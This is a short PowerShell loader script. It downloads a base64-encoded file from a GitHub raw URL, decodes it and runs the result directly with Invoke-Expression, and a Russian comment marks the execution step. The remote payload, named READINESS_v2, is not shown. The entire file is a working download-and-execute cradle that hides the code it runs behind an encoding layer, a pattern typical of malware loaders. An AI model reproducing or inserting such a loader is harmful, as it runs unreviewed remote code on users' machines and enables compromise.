# Loader script - downloads and executes READINESS_v2.ps1
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
$base64Url = 'https://raw.githubusercontent.com/Iwtyys/readiness-skytime/main/READINESS_v2.b64'

try {
    $webClient = New-Object System.Net.WebClient
    $base64 = $webClient.DownloadString($base64Url)
    $bytes = [Convert]::FromBase64String($base64)
    $script = [System.Text.Encoding]::UTF8.GetString($bytes)
    
    # Выполняем скрипт
    Invoke-Expression $script
} catch {
    Write-Error "Failed to load READINESS: $_"
}
